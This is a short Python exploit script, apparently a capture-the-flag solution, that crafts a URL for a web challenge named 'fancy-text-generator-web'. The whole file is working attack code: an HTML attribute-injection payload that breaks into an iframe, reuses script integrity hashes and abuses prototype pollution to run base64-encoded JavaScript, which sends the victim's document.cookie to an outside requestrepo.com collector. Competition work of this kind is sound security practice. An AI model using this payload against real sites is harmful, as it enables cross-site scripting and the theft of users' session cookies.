from urllib.parse import quote
import base64


target = "http://localhost:3001"
target = "https://fancy-text-generator-web.shared.challs.mt"

def make_xss_link(javascript):
    payload = """<a id="contentBox" data-pace-options="{&quot;className&quot;: &quot;\\u0022><iframe srcdoc=\\u0022<head><script defer integrity=&apos;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&apos; src=&apos;/loader.js&apos;></script><script integrity=&apos;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&apos; defer src=//xxx></script><script defer integrity=&apos;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&apos; src=&apos;loader.js&apos;></script><a data-pace-options=&apos;{&amp;quot;__proto__&amp;quot;:{&amp;quot;lmao&amp;quot;:&amp;quot;data:application/javascript;base64,{JAVASCRIPT}&amp;quot;}}&apos;></a></head>\\u0022></iframe>weee <a&quot;}"></a>""".replace("{JAVASCRIPT}", base64.b64encode(javascript.encode()).decode())
    exploit_url = target + "/?text=" + quote(payload)
    return exploit_url

js_payload = """location=`//7a7g5but.requestrepo.com/${btoa(document.cookie)}`;"""
xss_link = make_xss_link(js_payload)

print(xss_link)
